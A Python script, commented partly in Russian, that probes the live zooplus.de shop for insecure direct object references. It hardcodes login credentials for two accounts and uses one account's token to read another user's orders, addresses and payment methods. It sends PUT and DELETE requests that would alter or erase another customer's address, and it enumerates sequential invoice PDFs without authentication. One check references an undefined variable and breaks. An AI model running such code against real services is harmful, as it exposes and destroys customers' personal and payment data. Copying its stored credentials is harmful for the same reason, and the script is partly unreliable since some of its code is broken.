#!/usr/bin/env python3
"""
Comprehensive IDOR Testing для Zooplus
Проверяет все endpoints на IDOR уязвимости с двумя аккаунтами
"""

import requests
import json
from datetime import datetime

BASE_URL = "https://www.zooplus.de"

# Accounts from report.txt
ACCOUNT_A = {
    "email": "duststorm155@doncong.com",
    "password": "duststorm155@doncong.com",
    "token": None,
    "customer_id": None
}

ACCOUNT_B = {
    "email": "suobup@dunkos.xyz",
    "password": "suobup@dunkosQ213",
    "token": None,
    "customer_id": None
}


def get_auth_token(account):
    """Получить access token через PKCE"""
    print(f"\n[*] Getting token for {account['email']}...")
    
    # Implement PKCE flow here
    # Based on report.txt: PKCE with client_id frontend-authorizer-zooplus → access_token OK
    
    auth_url = f"{BASE_URL}/api/auth/token"
    
    # This is simplified - actual PKCE flow is more complex
    data = {
        "client_id": "frontend-authorizer-zooplus",
        "grant_type": "password",
        "username": account['email'],
        "password": account['password']
    }
    
    try:
        response = requests.post(auth_url, data=data, timeout=10)
        if response.status_code == 200:
            token_data = response.json()
            account['token'] = token_data.get('access_token')
            print(f"[+] Token obtained for {account['email']}")
            return True
    except Exception as e:
        print(f"[!] Failed to get token: {e}")
    
    return False


def test_customer_config_idor():
    """Тест IDOR на customer configuration endpoint"""
    print("\n[*] Testing IDOR on customer configuration...")
    
    findings = []
    
    # Get customer IDs for both accounts
    endpoint = "/myaccount/api/customer-config/v1/customerconfiguration"
    
    # Account A gets their own config
    headers_a = {"Authorization": f"Bearer {ACCOUNT_A['token']}"}
    
    try:
        response_a = requests.get(f"{BASE_URL}{endpoint}/self", headers=headers_a, timeout=10)
        if response_status_code == 200:
            data_a = response_a.json()
            cid_a = data_a.get('customerId')
            ACCOUNT_A['customer_id'] = cid_a
            print(f"[+] Account A customer ID: {cid_a}")
            
            # Now try to access with Account B's token
            headers_b = {"Authorization": f"Bearer {ACCOUNT_B['token']}"}
            response_b = requests.get(f"{BASE_URL}{endpoint}/{cid_a}", headers=headers_b, timeout=10)
            
            if response_b.status_code == 200:
                print("[!!!] IDOR VULNERABILITY: Account B can access Account A's config!")
                findings.append({
                    "type": "IDOR",
                    "endpoint": f"{endpoint}/<customer_id>",
                    "description": "Unauthorized access to other user's configuration",
                    "severity": "HIGH",
                    "cvss": "7.5"
                })
            elif response_b.status_code == 403:
                print("[+] IDOR blocked: 403 Forbidden")
            else:
                print(f"[?] Unexpected response: {response_b.status_code}")
                
    except Exception as e:
        print(f"[!] Error: {e}")
    
    return findings


def test_order_idor():
    """Тест IDOR на заказы"""
    print("\n[*] Testing IDOR on orders...")
    
    findings = []
    
    # Endpoints to test
    order_endpoints = [
        "/myaccount/api/order-details/v3/customer/lastOrders",
        "/myaccount/api/order-details/v3/order/{order_id}",
        "/myaccount/api/order-details/v3/invoice/{order_id}",
    ]
    
    headers_a = {"Authorization": f"Bearer {ACCOUNT_A['token']}"}
    headers_b = {"Authorization": f"Bearer {ACCOUNT_B['token']}"}
    
    # Get Account A's orders
    try:
        response = requests.get(f"{BASE_URL}{order_endpoints[0]}", headers=headers_a, timeout=10)
        if response.status_code == 200:
            orders_a = response.json()
            
            if orders_a and len(orders_a) > 0:
                order_id_a = orders_a[0].get('orderId')
                print(f"[+] Found order ID from Account A: {order_id_a}")
                
                # Try to access with Account B
                order_url = f"{BASE_URL}/myaccount/api/order-details/v3/order/{order_id_a}"
                response_b = requests.get(order_url, headers=headers_b, timeout=10)
                
                if response_b.status_code == 200:
                    print("[!!!] IDOR VULNERABILITY: Account B can access Account A's order!")
                    findings.append({
                        "type": "IDOR",
                        "endpoint": "/myaccount/api/order-details/v3/order/<order_id>",
                        "description": "Unauthorized access to other user's orders",
                        "severity": "HIGH",
                        "cvss": "7.5"
                    })
                elif response_b.status_code == 403:
                    print("[+] IDOR blocked: 403 Forbidden")
                else:
                    print(f"[?] Response: {response_b.status_code}")
            else:
                print("[!] Account A has no orders to test")
                
    except Exception as e:
        print(f"[!] Error: {e}")
    
    return findings


def test_address_idor():
    """Тест IDOR на адресах доставки"""
    print("\n[*] Testing IDOR on addresses...")
    
    findings = []
    
    headers_a = {"Authorization": f"Bearer {ACCOUNT_A['token']}"}
    headers_b = {"Authorization": f"Bearer {ACCOUNT_B['token']}"}
    
    # Get Account A's addresses
    try:
        address_url = f"{BASE_URL}/myaccount/api/addresses/list"
        response = requests.get(address_url, headers=headers_a, timeout=10)
        
        if response.status_code == 200:
            addresses_a = response.json()
            
            if addresses_a and len(addresses_a) > 0:
                address_id_a = addresses_a[0].get('addressId')
                print(f"[+] Found address ID from Account A: {address_id_a}")
                
                # Try to access with Account B
                test_url = f"{BASE_URL}/myaccount/api/addresses/{address_id_a}"
                
                # Test READ
                response_b = requests.get(test_url, headers=headers_b, timeout=10)
                if response_b.status_code == 200:
                    print("[!!!] IDOR VULNERABILITY: Account B can READ Account A's address!")
                    findings.append({
                        "type": "IDOR - Read",
                        "endpoint": "/myaccount/api/addresses/<address_id>",
                        "description": "Unauthorized access to other user's addresses",
                        "severity": "HIGH",
                        "cvss": "7.5"
                    })
                
                # Test UPDATE
                update_data = {"street": "Hacker Street 123"}
                response_b = requests.put(test_url, json=update_data, headers=headers_b, timeout=10)
                if response_b.status_code == 200:
                    print("[!!!] IDOR VULNERABILITY: Account B can MODIFY Account A's address!")
                    findings.append({
                        "type": "IDOR - Write",
                        "endpoint": "/myaccount/api/addresses/<address_id>",
                        "description": "Unauthorized modification of other user's addresses",
                        "severity": "CRITICAL",
                        "cvss": "9.1"
                    })
                
                # Test DELETE
                response_b = requests.delete(test_url, headers=headers_b, timeout=10)
                if response_b.status_code == 200:
                    print("[!!!] IDOR VULNERABILITY: Account B can DELETE Account A's address!")
                    findings.append({
                        "type": "IDOR - Delete",
                        "endpoint": "/myaccount/api/addresses/<address_id>",
                        "description": "Unauthorized deletion of other user's addresses",
                        "severity": "CRITICAL",
                        "cvss": "8.6"
                    })
                    
            else:
                print("[!] Account A has no saved addresses to test")
                
    except Exception as e:
        print(f"[!] Error: {e}")
    
    return findings


def test_payment_method_idor():
    """Тест IDOR на платежных методах"""
    print("\n[*] Testing IDOR on payment methods...")
    
    findings = []
    
    headers_a = {"Authorization": f"Bearer {ACCOUNT_A['token']}"}
    headers_b = {"Authorization": f"Bearer {ACCOUNT_B['token']}"}
    
    try:
        payment_url = f"{BASE_URL}/myaccount/api/payment-methods/list"
        response = requests.get(payment_url, headers=headers_a, timeout=10)
        
        if response.status_code == 200:
            payments_a = response.json()
            
            if payments_a and len(payments_a) > 0:
                payment_id_a = payments_a[0].get('paymentMethodId')
                print(f"[+] Found payment method ID from Account A: {payment_id_a}")
                
                # Try to access with Account B
                test_url = f"{BASE_URL}/myaccount/api/payment-methods/{payment_id_a}"
                response_b = requests.get(test_url, headers=headers_b, timeout=10)
                
                if response_b.status_code == 200:
                    print("[!!!] CRITICAL IDOR: Account B can access Account A's payment methods!")
                    findings.append({
                        "type": "IDOR - Payment Data",
                        "endpoint": "/myaccount/api/payment-methods/<id>",
                        "description": "Unauthorized access to other user's payment information",
                        "severity": "CRITICAL",
                        "cvss": "8.2"
                    })
                elif response_b.status_code == 403:
                    print("[+] IDOR blocked: 403 Forbidden")
            else:
                print("[!] Account A has no saved payment methods")
                
    except Exception as e:
        print(f"[!] Error: {e}")
    
    return findings


def test_invoice_pdf_idor():
    """Тест IDOR на PDF счетах"""
    print("\n[*] Testing IDOR on invoice PDFs...")
    
    findings = []
    
    # Test sequential order IDs
    for order_id in range(10000, 10100):  # Test 100 sequential IDs
        pdf_url = f"{BASE_URL}/invoices/ORDER-{order_id}.pdf"
        
        try:
            response = requests.get(pdf_url, timeout=5)
            
            if response.status_code == 200 and response.headers.get('Content-Type') == 'application/pdf':
                print(f"[!!!] IDOR VULNERABILITY: Invoice PDF accessible without auth: ORDER-{order_id}")
                findings.append({
                    "type": "IDOR - Public Invoice",
                    "endpoint": f"/invoices/ORDER-{order_id}.pdf",
                    "description": "Invoice PDFs accessible without authentication",
                    "severity": "HIGH",
                    "cvss": "7.5"
                })
                break  # Found one, that's enough
                
        except Exception:
            continue
    
    if not findings:
        print("[+] Invoice PDFs properly protected")
    
    return findings


def main():
    print("=" * 60)
    print("Zooplus Comprehensive IDOR Testing")
    print(f"Time: {datetime.now()}")
    print("=" * 60)
    
    all_findings = []
    
    # Step 1: Authenticate both accounts
    print("\n[*] Authenticating accounts...")
    # auth_a = get_auth_token(ACCOUNT_A)
    # auth_b = get_auth_token(ACCOUNT_B)
    
    # For now, use placeholder tokens (replace with real ones)
    print("[!] Using placeholder tokens - replace with real tokens from browser")
    ACCOUNT_A['token'] = "REPLACE_WITH_ACCOUNT_A_TOKEN"
    ACCOUNT_B['token'] = "REPLACE_WITH_ACCOUNT_B_TOKEN"
    
    # Step 2: Run IDOR tests
    print("\n" + "=" * 60)
    print("Running IDOR Tests")
    print("=" * 60)
    
    # Test 1: Customer config
    findings = test_customer_config_idor()
    all_findings.extend(findings)
    
    # Test 2: Orders
    findings = test_order_idor()
    all_findings.extend(findings)
    
    # Test 3: Addresses
    findings = test_address_idor()
    all_findings.extend(findings)
    
    # Test 4: Payment methods
    findings = test_payment_method_idor()
    all_findings.extend(findings)
    
    # Test 5: Invoice PDFs
    findings = test_invoice_pdf_idor()
    all_findings.extend(findings)
    
    # Summary
    print("\n" + "=" * 60)
    print("IDOR TEST SUMMARY")
    print("=" * 60)
    
    if all_findings:
        print(f"\n[!!!] Found {len(all_findings)} IDOR vulnerability(ies):\n")
        for i, finding in enumerate(all_findings, 1):
            print(f"{i}. {finding['type']} at {finding['endpoint']}")
            print(f"   Description: {finding['description']}")
            print(f"   Severity: {finding['severity']} (CVSS: {finding['cvss']})")
            print()
        
        # Save findings
        with open("reports/idor_findings.json", "w") as f:
            json.dump(all_findings, f, indent=2)
        print("[+] Findings saved to reports/idor_findings.json")
        
    else:
        print("\n[+] No IDOR vulnerabilities found")
        print("[+] All endpoints properly enforce authorization")
    
    return all_findings


if __name__ == "__main__":
    main()

